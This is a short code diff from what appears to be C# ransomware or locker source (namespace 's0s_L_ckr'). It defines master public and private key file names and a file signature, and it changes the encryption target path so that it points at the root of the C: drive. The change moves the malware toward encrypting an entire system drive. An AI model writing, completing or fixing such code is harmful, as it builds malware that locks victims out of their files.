@@ -31,7 +31,7 @@ namespace s0s_L_ckr
         public const string LOCL_PUB_KEY_NAM = "master_public_key.info";
         public const string LOCL_PRI_KEY_NAM = "master_private_key.info";
         //PATH for encryption
-        public static readonly string[] TRGT_PTH_FLR = new string[] { "C://" };
+        public static readonly string[] TRGT_PTH_FLR = new string[] { "C:\\" };
 
         public static readonly byte[] FILE_SIGN = new byte[] {
             55,55,
